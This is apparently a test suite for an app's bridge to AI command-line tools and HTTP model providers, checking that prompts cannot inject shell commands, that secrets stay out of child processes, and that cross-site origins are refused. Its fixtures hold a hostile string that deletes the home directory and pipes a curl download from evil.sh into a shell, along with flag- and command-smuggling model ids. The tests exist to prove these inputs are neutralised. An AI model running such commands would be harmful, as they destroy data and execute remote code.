/**
 * CLI bridge + connections + 2.0 HTTP providers. Child processes are faked via the
 * cli-bridge spawn seam (except the timeout/cap tests, which use real /bin/sleep and
 * /usr/bin/yes); fetch is stubbed. No real AI CLI or network call happens here.
 */
import { describe, it, expect, beforeAll, afterAll, afterEach, vi } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { EventEmitter } from "node:events";
import { PassThrough } from "node:stream";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "pf-conn-test-"));
process.env.PF_DATA_DIR = tmp;

const bridge = await import("./cli-bridge");
const { setSecret, getSecret, clearImportedEnv, setProviderConfig } = await import("./secrets");
const { PROVIDERS, getProvider } = await import("./providers");
const { registerConnectionRoutes, isLocalOrigin, rescanConnections } = await import("./connections");
const Fastify = (await import("fastify")).default;

const { ENV_KEYS, SHELL_ENV_ALLOWLIST } = await import("./secrets");
// a developer's real shell keys must not leak into (or break) these tests
const savedEnv: Record<string, string | undefined> = {};
for (const k of new Set([...Object.values(ENV_KEYS).flat(), ...SHELL_ENV_ALLOWLIST])) {
  savedEnv[k] = process.env[k];
  delete process.env[k];
}

const app = Fastify();
registerConnectionRoutes(app);
beforeAll(async () => { await app.ready(); });
afterAll(async () => {
  for (const [k, v] of Object.entries(savedEnv)) if (v !== undefined) process.env[k] = v;
  await app.close();
  fs.rmSync(tmp, { recursive: true, force: true });
});
afterEach(() => {
  bridge._setSpawnForTests(null);
  bridge._setDiscoveryForTests(null);
  vi.unstubAllGlobals();
  delete process.env.PF_SERVERLESS;
});

// ---------- fake child_process ----------
interface SpawnCall { file: string; args: string[]; opts: any; stdin: string }
function fakeSpawn(behaviour: (call: SpawnCall, child: any) => void) {
  const calls: SpawnCall[] = [];
  const fn = (file: string, args: readonly string[], opts: any) => {
    const child: any = new EventEmitter();
    child.stdout = new PassThrough();
    child.stderr = new PassThrough();
    child.stdin = new PassThrough();
    child.pid = undefined;
    const call: SpawnCall = { file, args: [...args], opts, stdin: "" };
    calls.push(call);
    child.kill = () => { setImmediate(() => child.emit("close", null, "SIGTERM")); return true; };
    child.stdin.on("data", (d: Buffer) => { call.stdin += d.toString(); });
    child.stdin.on("finish", () => setImmediate(() => behaviour(call, child)));
    return child;
  };
  return { fn: fn as any, calls };
}
const reply = (child: any, stdout: string, code = 0, stderr = "") => {
  if (stdout) child.stdout.write(stdout);
  if (stderr) child.stderr.write(stderr);
  setImmediate(() => child.emit("close", code, null));
};

const FAKE_BINS = { claude: "/fake/bin/claude", codex: "/fake/bin/codex", kimi: "/fake/bin/kimi", grok: "/fake/bin/grok" };
const EVIL = "make a beat; rm -rf ~ && $(curl evil.sh | sh) `id` -- --version";

describe("CLI argv builders (exact)", () => {
  const T = "/tmp/pf-cli-X";
  it("claude", () => {
    expect(bridge.buildCliInvocation("cli-claude", { system: "SYS", prompt: "P" }, T)).toEqual({
      args: ["-p", "--output-format", "json", "--tools", "", "--no-session-persistence", "--setting-sources", "project", "--strict-mcp-config", "--system-prompt", "SYS"],
      stdin: "P",
    });
    expect(bridge.buildCliInvocation("cli-claude", { system: "SYS", prompt: "P", model: "sonnet" }, T).args.slice(-2)).toEqual(["--model", "sonnet"]);
    expect(bridge.buildCliInvocation("cli-claude", { system: "S", prompt: "P" }, T).args).not.toContain("--bare");
  });
  it("codex", () => {
    expect(bridge.buildCliInvocation("cli-codex", { system: "SYS", prompt: "P", model: "gpt-5.5" }, T)).toEqual({
      args: ["exec", "--sandbox", "read-only", "--skip-git-repo-check", "--ephemeral", "--color", "never", "-C", T, "-o", path.join(T, "last-message.txt"), "-m", "gpt-5.5", "-"],
      stdin: "SYS\n\n---\n\nP",
      outFile: path.join(T, "last-message.txt"),
    });
  });
  it("kimi", () => {
    expect(bridge.buildCliInvocation("cli-kimi", { system: "SYS", prompt: "P" }, T)).toEqual({
      args: ["-p", "SYS\n\n---\n\nP", "--plan", "--output-format", "text"],
    });
    expect(bridge.buildCliInvocation("cli-kimi", { system: "", prompt: "P", model: "k3" }, T).args).toEqual(["-p", "P", "--plan", "--output-format", "text", "-m", "k3"]);
  });
  it("grok (plain + json-schema)", () => {
    expect(bridge.buildCliInvocation("cli-grok", { system: "SYS", prompt: "P" }, T)).toEqual({
      args: ["--single=P", "--output-format", "plain", "--cwd", T, "--disable-web-search", "--no-subagents", "--max-turns", "1", "--permission-mode", "plan", "--rules=SYS"],
    });
    const schema = { type: "object", properties: { a: { type: "string" } } };
    expect(bridge.buildCliInvocation("cli-grok", { system: "SYS", prompt: "P", model: "grok-4.7", jsonSchema: schema }, T).args).toEqual([
      "--single=P", "--output-format", "json", "--cwd", T, "--disable-web-search", "--no-subagents", "--max-turns", "1", "--permission-mode", "plan", "--rules=SYS",
      `--json-schema=${JSON.stringify(schema)}`, "-m", "grok-4.7",
    ]);
  });
  it("hostile prompt text stays one verbatim argv element / stdin", () => {
    expect(bridge.buildCliInvocation("cli-claude", { system: "S", prompt: EVIL }, "/t").stdin).toBe(EVIL);
    expect(bridge.buildCliInvocation("cli-codex", { system: "", prompt: EVIL }, "/t").stdin).toBe(EVIL);
    const kimi = bridge.buildCliInvocation("cli-kimi", { system: "", prompt: EVIL }, "/t").args;
    expect(kimi[1]).toBe(EVIL);
    expect(kimi).toHaveLength(5);
    const grok = bridge.buildCliInvocation("cli-grok", { system: "", prompt: "--version" }, "/t").args;
    expect(grok[0]).toBe("--single=--version");
    expect(grok).not.toContain("--version");
  });
  it("rejects model ids that could smuggle flags", () => {
    for (const bad of ["--dangerously-skip-permissions", "-x", "a b", "m;rm", "$(id)"]) {
      expect(() => bridge.buildCliInvocation("cli-claude", { system: "", prompt: "", model: bad }, "/t")).toThrow(/Invalid model/);
    }
  });
});

describe("CLI execution safety", () => {
  it("claude run: absolute path, argv array, shell:false, temp cwd removed, no API keys in env, result parsed + ANSI stripped", async () => {
    bridge._setDiscoveryForTests(FAKE_BINS);
    process.env.ANTHROPIC_API_KEY = "sk-ant-should-not-leak-1234567890";
    process.env.SOME_PRIVATE_VAR = "nope";
    const f = fakeSpawn((_c, child) => reply(child, `\u001b[32m${JSON.stringify({ type: "result", subtype: "success", is_error: false, result: "\u001b[1m{\"ok\":true}\u001b[0m" })}`));
    bridge._setSpawnForTests(f.fn);
    const out = await getProvider("cli-claude").chat!({ system: "sys", user: EVIL });
    delete process.env.ANTHROPIC_API_KEY;
    delete process.env.SOME_PRIVATE_VAR;
    expect(out).toBe('{"ok":true}');
    expect(f.calls).toHaveLength(1);
    const c = f.calls[0]!;
    expect(c.file).toBe("/fake/bin/claude");
    expect(Array.isArray(c.args)).toBe(true);
    expect(c.opts.shell).toBe(false);
    expect(c.stdin).toBe(EVIL);
    expect(c.args.join(" ")).not.toContain("rm -rf");
    expect(path.basename(c.opts.cwd)).toMatch(/^pf-cli-/);
    expect(fs.existsSync(c.opts.cwd)).toBe(false); // deleted after the call
    expect(Object.keys(c.opts.env).sort()).toEqual(expect.arrayContaining(["HOME", "LANG", "PATH", "TERM"]));
    expect(c.opts.env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(c.opts.env.SOME_PRIVATE_VAR).toBeUndefined();
    expect(c.opts.env.TERM).toBe("dumb");
    expect(c.opts.env.PATH.split(":")[0]).toBe("/fake/bin"); // CLI's own dir first (node-script CLIs)
  });
  it("claude not logged in → clear message", async () => {
    bridge._setDiscoveryForTests(FAKE_BINS);
    const f = fakeSpawn((_c, child) => reply(child, JSON.stringify({ type: "result", subtype: "success", is_error: true, result: "Not logged in · Please run /login" }), 1));
    bridge._setSpawnForTests(f.fn);
    await expect(getProvider("cli-claude").chat!({ system: "s", user: "u" })).rejects.toThrow(/Claude Code isn't logged in — run `claude`/);
  });
  it("codex reads the -o file; kimi + grok return stdout", async () => {
    bridge._setDiscoveryForTests(FAKE_BINS);
    const f = fakeSpawn((c, child) => {
      if (c.file.endsWith("codex")) {
        const o = c.args[c.args.indexOf("-o") + 1]!;
        fs.writeFileSync(o, "codex answer\n");
        reply(child, "progress noise");
      } else reply(child, `${path.basename(c.file)} answer\n`);
    });
    bridge._setSpawnForTests(f.fn);
    expect(await getProvider("cli-codex").chat!({ system: "s", user: "review" })).toBe("codex answer");
    expect(f.calls[0]!.args.at(-1)).toBe("-"); // "review" never becomes the codex subcommand
    expect(f.calls[0]!.stdin).toBe("s\n\n---\n\nreview");
    expect(await getProvider("cli-kimi").chat!({ system: "s", user: "u" })).toBe("kimi answer");
    expect(await getProvider("cli-grok").chat!({ system: "s", user: "u" })).toBe("grok answer");
  });
  it("unknown / non-CLI provider ids can't execute anything", async () => {
    const f = fakeSpawn((_c, child) => reply(child, "x"));
    bridge._setSpawnForTests(f.fn);
    await expect(bridge.runCliChat("cli-evil", { system: "", prompt: "" })).rejects.toThrow(/Not a CLI provider/);
    await expect(bridge.runCliChat("/bin/sh", { system: "", prompt: "" })).rejects.toThrow(/Not a CLI provider/);
    await expect(bridge.runCliChat("__proto__", { system: "", prompt: "" })).rejects.toThrow(/Not a CLI provider/);
    expect(bridge.findBinarySync("rm")).toBeNull();
    expect(bridge.findBinarySync("sh")).toBeNull();
    expect(() => getProvider("cli-evil")).toThrow(/Unknown provider/);
    expect(f.calls).toHaveLength(0);
    const res = await app.inject({ method: "POST", url: "/api/connections/test", payload: { providerId: "/bin/sh" } });
    expect(res.statusCode).toBe(404);
  });
  it("not installed → clear message, nothing spawned", async () => {
    bridge._setDiscoveryForTests({ claude: null });
    const f = fakeSpawn((_c, child) => reply(child, "x"));
    bridge._setSpawnForTests(f.fn);
    await expect(getProvider("cli-claude").chat!({ system: "", user: "" })).rejects.toThrow(/not installed/);
    expect(f.calls).toHaveLength(0);
  });
  it("timeout kills the whole process group (grandchild too) with a clear error", async () => {
    const dir = fs.mkdtempSync(path.join(tmp, "bin-"));
    const pidFile = path.join(dir, "pid");
    const script = path.join(dir, "claude");
    fs.writeFileSync(script, `#!/bin/sh\n/bin/sleep 30 &\necho $! > "${pidFile}"\nwait\n`, { mode: 0o755 });
    bridge._setDiscoveryForTests({ claude: script });
    const t0 = Date.now();
    await expect(bridge.runCliChat("cli-claude", { system: "s", prompt: "p" }, { timeoutMs: 600 })).rejects.toThrow(/timed out after 1 s and was stopped/);
    expect(Date.now() - t0).toBeLessThan(5000);
    const pid = Number(fs.readFileSync(pidFile, "utf8"));
    await new Promise((r) => setTimeout(r, 200));
    expect(() => process.kill(pid, 0)).toThrow(); // ESRCH: grandchild sleep is gone
  });
  it("output is capped at 4 MB", async () => {
    const r = await bridge.runProcess({ file: "/usr/bin/yes", args: [], cwd: tmp, env: { PATH: "/usr/bin:/bin" }, timeoutMs: 10_000 });
    expect(r.truncated).toBe(true);
    expect(Buffer.byteLength(r.stdout)).toBeLessThanOrEqual(bridge.MAX_OUTPUT_BYTES);
    expect(Buffer.byteLength(r.stdout)).toBeGreaterThan(bridge.MAX_OUTPUT_BYTES - 16);
    expect(bridge.classifyFailure(bridge.CLI_SPECS["cli-claude"], r, 1000)).toMatch(/more than 4 MB/);
  });
  it("ANSI + control chars stripped", () => {
    expect(bridge.stripAnsi("\u001b[31mred\u001b[0m \u001b]0;title\u0007ok\u001b[2K")).toBe("red ok");
  });
  it("claude JSON result parsing", () => {
    expect(bridge.parseClaudeJson('{"type":"result","subtype":"success","is_error":false,"result":"hello"}')).toEqual({ text: "hello", isError: false });
    expect(bridge.parseClaudeJson('{"type":"result","subtype":"error_max_turns","result":""}').isError).toBe(true);
  });
});

describe("PF_SERVERLESS=1", () => {
  it("CLI providers are unavailable and never spawn", async () => {
    process.env.PF_SERVERLESS = "1";
    bridge._setDiscoveryForTests(FAKE_BINS);
    const f = fakeSpawn((_c, child) => reply(child, "x"));
    bridge._setSpawnForTests(f.fn);
    for (const id of bridge.CLI_PROVIDER_IDS) {
      const p = getProvider(id);
      expect(p.configured()).toBe(false);
      expect((await p.testConnection()).ok).toBe(false);
      await expect(p.chat!({ system: "", user: "" })).rejects.toThrow(/desktop app/);
    }
    rescanConnections();
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("offline"); }));
    const res = await app.inject({ method: "GET", url: "/api/connections" });
    expect(res.json().serverless).toBe(true);
    expect(res.json().clis.every((c: any) => !c.installed && c.path === null)).toBe(true);
    expect(f.calls).toHaveLength(0);
  });
});

describe("env auto-import + /api/connections", () => {
  it("parses only allow-listed names", () => {
    const raw = "PATH=/usr/bin\nOPENAI_API_KEY=sk-imported-abc1234567890\nAWS_SECRET_ACCESS_KEY=zzz\nGITHUB_TOKEN=ghp_x\nXAI_API_KEY=xai-123456789012\n";
    expect(bridge.parseAllowlistedEnv(raw)).toEqual({ OPENAI_API_KEY: "sk-imported-abc1234567890", XAI_API_KEY: "xai-123456789012" });
  });
  it("login-shell import → getSecret uses it; report shows names/booleans but never values", async () => {
    const saved = { OPENAI_API_KEY: process.env.OPENAI_API_KEY, XAI_API_KEY: process.env.XAI_API_KEY };
    delete process.env.OPENAI_API_KEY;
    delete process.env.XAI_API_KEY;
    bridge._setDiscoveryForTests({ claude: "/fake/bin/claude", codex: null, kimi: null, grok: "/fake/bin/grok" });
    const f = fakeSpawn((c, child) => {
      if (c.args[0] === "-ilc") {
        // a shell that (wrongly) prints extra vars too — they must still be dropped
        reply(child, "motd noise\n__PF_ENV_BEGIN__\nOPENAI_API_KEY=sk-imported-abc1234567890\nAWS_SECRET_ACCESS_KEY=leak-me-not-999\n__PF_ENV_END__\n");
      } else if (c.args[0] === "--version") reply(child, `${path.basename(c.file)} 9.9.9\n`);
      else reply(child, "", 1);
    });
    bridge._setSpawnForTests(f.fn);
    vi.stubGlobal("fetch", vi.fn(async (url: string) => {
      if (String(url).includes("11434/api/tags")) return new Response(JSON.stringify({ models: [{ name: "llama3.1:8b" }] }), { status: 200 });
      throw new Error("ECONNREFUSED");
    }));
    const names = await bridge.importLoginShellEnv(true);
    expect(names).toEqual(["OPENAI_API_KEY"]);
    expect(getSecret("openai")).toBe("sk-imported-abc1234567890");
    // the shell command itself filters by the allow-list (values of other vars never reach us)
    const shellCall = f.calls.find((c) => c.args[0] === "-ilc")!;
    expect(shellCall.opts.shell).toBe(false);
    expect(shellCall.args[1]).toContain("grep -E '^(ANTHROPIC_API_KEY|OPENAI_API_KEY|");

    rescanConnections();
    await bridge.importLoginShellEnv(true);
    const res = await app.inject({ method: "GET", url: "/api/connections" });
    expect(res.statusCode).toBe(200);
    expect(res.payload).not.toContain("sk-imported");
    expect(res.payload).not.toContain("leak-me-not");
    const body = res.json();
    expect(Object.keys(body).sort()).toEqual(["clis", "envKeys", "importedFromShell", "local", "serverless"]);
    expect(body.importedFromShell).toEqual(["OPENAI_API_KEY"]);
    expect(body.envKeys.find((e: any) => e.envVar === "OPENAI_API_KEY")).toEqual({ providerId: "openai", envVar: "OPENAI_API_KEY", present: true, source: "login-shell" });
    for (const e of body.envKeys) expect(Object.keys(e).sort()).toEqual(["envVar", "present", "providerId", "source"]);
    const claude = body.clis.find((c: any) => c.id === "cli-claude");
    expect(claude).toEqual({ id: "cli-claude", name: "Claude Code (subscription)", binary: "claude", path: "/fake/bin/claude", version: "claude 9.9.9", installed: true, supported: true });
    expect(body.clis.find((c: any) => c.id === "cli-codex").installed).toBe(false);
    expect(body.clis.filter((c: any) => !c.supported).map((c: any) => c.id)).toEqual(["gemini", "opencode", "qwen", "cursor-agent", "goose"]);
    expect(body.local).toEqual([
      { id: "ollama", url: "http://127.0.0.1:11434/api/tags", reachable: true, models: ["llama3.1:8b"] },
      { id: "lmstudio", url: "http://127.0.0.1:1234/v1/models", reachable: false, models: [] },
    ]);
    clearImportedEnv();
    expect(getSecret("openai")).toBeNull();
    for (const [k, v] of Object.entries(saved)) if (v !== undefined) process.env[k] = v;
  });
  it("rejects cross-site origins", async () => {
    expect(isLocalOrigin("http://localhost:5173")).toBe(true);
    expect(isLocalOrigin(undefined)).toBe(true);
    expect(isLocalOrigin("https://evil.example")).toBe(false);
    expect(isLocalOrigin("http://127.0.0.1.evil.example")).toBe(false);
    const res = await app.inject({ method: "POST", url: "/api/connections/test", headers: { origin: "https://evil.example" }, payload: { providerId: "cli-claude" } });
    expect(res.statusCode).toBe(403);
  });
  it("POST /api/connections/test runs the provider's real test (CLI: tiny OK prompt)", async () => {
    bridge._setDiscoveryForTests(FAKE_BINS);
    const f = fakeSpawn((c, child) => {
      if (c.args[0] === "--version") reply(child, "2.1.215 (Claude Code)\n");
      else reply(child, JSON.stringify({ type: "result", subtype: "success", is_error: false, result: "OK" }));
    });
    bridge._setSpawnForTests(f.fn);
    const res = await app.inject({ method: "POST", url: "/api/connections/test", payload: { providerId: "cli-claude" } });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ providerId: "cli-claude", ok: true });
    const run = f.calls.find((c) => c.args[0] === "-p")!;
    expect(run.stdin).toBe("Reply with exactly: OK");
  });
});

// ---------- HTTP providers: exact documented URL + auth header ----------
function stubFetch(body: unknown = { choices: [{ message: { content: "hi" } }] }, contentType = "application/json") {
  const fn = vi.fn(async (_url: string, _init?: RequestInit) =>
    typeof body === "string" || body instanceof Uint8Array
      ? new Response(body as any, { status: 200, headers: { "content-type": contentType } })
      : new Response(JSON.stringify(body), { status: 200, headers: { "content-type": contentType } }));
  vi.stubGlobal("fetch", fn);
  return fn;
}
const hdr = (init: RequestInit | undefined, name: string) => (init?.headers as Record<string, string>)[name];

describe("2.0 HTTP providers hit the documented endpoints", () => {
  const cases: [string, string, string][] = [
    ["xai", "https://api.x.ai/v1/chat/completions", "grok-4.7"],
    ["moonshot", "https://api.moonshot.ai/v1/chat/completions", "kimi-k3"],
    ["kimi-coding", "https://api.kimi.ai/coding/v1/chat/completions", "kimi-for-coding"],
    ["zai", "https://api.z.ai/api/paas/v4/chat/completions", "glm-5.3"],
    ["zai-coding", "https://api.z.ai/api/coding/paas/v4/chat/completions", "glm-5.3"],
    ["deepseek", "https://api.deepseek.com/chat/completions", "deepseek-flash"],
    ["mistral", "https://api.mistral.ai/v1/chat/completions", "mistral-large-latest"],
    ["groq", "https://api.groq.com/openai/v1/chat/completions", "llama-3.3-70b-versatile"],
    ["together", "https://api.together.ai/v1/chat/completions", "MiniMaxAI/MiniMax-M3"],
  ];
  for (const [id, url, model] of cases) {
    it(`${id} → ${url} with Bearer key`, async () => {
      setSecret(id, `test-key-${id}-1234567890`);
      const f = stubFetch();
      expect(await getProvider(id).chat!({ system: "s", user: "u" })).toBe("hi");
      const [calledUrl, init] = f.mock.calls[0]!;
      expect(calledUrl).toBe(url);
      expect(init?.method).toBe("POST");
      expect(hdr(init, "authorization")).toBe(`Bearer test-key-${id}-1234567890`);
      const body = JSON.parse(String(init?.body));
      expect(body.model).toBe(model);
      expect(body.messages).toEqual([{ role: "system", content: "s" }, { role: "user", content: "u" }]);
      if (id === "xai") {
        expect(body.max_completion_tokens).toBe(8192);
        expect(body.max_tokens).toBeUndefined();
      }
      if (id === "kimi-coding") expect(hdr(init, "user-agent")).toBe("PulseForge-Studio/2.0"); // honest identity
      expect(body.response_format).toBeUndefined();
      setSecret(id, "");
    });
  }
  it("lmstudio is keyless on 127.0.0.1:1234/v1", async () => {
    const f = stubFetch();
    expect(getProvider("lmstudio").configured()).toBe(true);
    await getProvider("lmstudio").chat!({ system: "s", user: "u" });
    expect(f.mock.calls[0]![0]).toBe("http://127.0.0.1:1234/v1/chat/completions");
    expect(hdr(f.mock.calls[0]![1], "authorization")).toBeUndefined();
  });
  it("OpenAI uses native response_format only when a schema is supplied", async () => {
    setSecret("openai", "sk-test-openai-1234567890");
    const f = stubFetch();
    const schema = { type: "object" };
    await getProvider("openai").chat!({ system: "s", user: "u", jsonSchema: schema });
    expect(JSON.parse(String(f.mock.calls[0]![1]?.body)).response_format).toEqual({ type: "json_schema", json_schema: { name: "response", schema } });
    await getProvider("openai").chat!({ system: "s", user: "u" });
    expect(JSON.parse(String(f.mock.calls[1]![1]?.body)).response_format).toBeUndefined();
    setSecret("openai", "");
  });
  it("anthropic-compatible: baseUrl + /v1/messages, x-api-key + anthropic-version (or Bearer)", async () => {
    setSecret("anthropic-compatible", "zai-test-key-1234567890");
    setProviderConfig("anthropic-compatible", { baseUrl: "https://api.z.ai/api/anthropic", model: "glm-5.3" });
    const f = stubFetch({ content: [{ type: "text", text: "yo" }] });
    expect(await getProvider("anthropic-compatible").chat!({ system: "s", user: "u" })).toBe("yo");
    let [u, init] = f.mock.calls[0]!;
    expect(u).toBe("https://api.z.ai/api/anthropic/v1/messages");
    expect(hdr(init, "x-api-key")).toBe("zai-test-key-1234567890");
    expect(hdr(init, "anthropic-version")).toBe("2023-06-01");
    expect(JSON.parse(String(init?.body))).toMatchObject({ model: "glm-5.3", system: "s", messages: [{ role: "user", content: "u" }] });
    setProviderConfig("anthropic-compatible", { baseUrl: "https://api.kimi.ai/coding/", model: "kimi-for-coding", authHeader: "bearer" });
    await getProvider("anthropic-compatible").chat!({ system: "s", user: "u" });
    [u, init] = f.mock.calls[1]!;
    expect(u).toBe("https://api.kimi.ai/coding/v1/messages");
    expect(hdr(init, "authorization")).toBe("Bearer zai-test-key-1234567890");
    expect(hdr(init, "x-api-key")).toBeUndefined();
    setSecret("anthropic-compatible", "");
    setProviderConfig("anthropic-compatible", {});
  });
  it("fish-audio TTS: POST /v1/tts, Bearer, model header, JSON body", async () => {
    setSecret("fish-audio", "fish-test-key-1234567890");
    setProviderConfig("fish-audio", { voiceId: "voice-abc" });
    const f = stubFetch(new Uint8Array([1, 2, 3]), "audio/mpeg");
    const out = await getProvider("fish-audio").generateAudio!({ prompt: "hello there", kind: "speech" });
    expect(out.audio.length).toBe(3);
    const [u, init] = f.mock.calls[0]!;
    expect(u).toBe("https://api.fish.audio/v1/tts");
    expect(hdr(init, "authorization")).toBe("Bearer fish-test-key-1234567890");
    expect(hdr(init, "model")).toBe("s2.1-pro");
    expect(hdr(init, "content-type")).toBe("application/json");
    expect(JSON.parse(String(init?.body))).toEqual({ text: "hello there", format: "mp3", reference_id: "voice-abc" });
    await expect(getProvider("fish-audio").generateAudio!({ prompt: "x", kind: "music" })).rejects.toThrow(/speech/);
    const t = stubFetch({ credit: "12.5" });
    expect((await getProvider("fish-audio").testConnection()).ok).toBe(true);
    expect(t.mock.calls[0]![0]).toBe("https://api.fish.audio/wallet/self/api-credit");
    setSecret("fish-audio", "");
  });
  it("ElevenLabs music: POST /v1/music with xi-api-key and music_length_ms", async () => {
    setSecret("elevenlabs", "el-test-key-1234567890");
    const f = stubFetch(new Uint8Array([9, 9]), "audio/mpeg");
    await getProvider("elevenlabs").generateAudio!({ prompt: "lofi beat", kind: "music", durationSec: 30 });
    const [u, init] = f.mock.calls[0]!;
    expect(u).toBe("https://api.elevenlabs.io/v1/music");
    expect(hdr(init, "xi-api-key")).toBe("el-test-key-1234567890");
    expect(JSON.parse(String(init?.body))).toEqual({ prompt: "lofi beat", music_length_ms: 30000, model_id: "music_v1" });
    await getProvider("elevenlabs").generateAudio!({ prompt: "x", kind: "music", durationSec: 1 });
    expect(JSON.parse(String(f.mock.calls[1]![1]?.body)).music_length_ms).toBe(3000); // documented minimum
    setSecret("elevenlabs", "");
  });
  it("honest capabilities: every claimed audio capability is backed by a method", () => {
    for (const p of PROVIDERS) {
      if (p.capabilities.some((c) => c === "text-to-speech" || c === "text-to-music" || c === "text-to-sound")) expect(p.generateAudio).toBeTypeOf("function");
      if (p.capabilities.includes("composition")) expect(p.chat).toBeTypeOf("function");
    }
  });
});
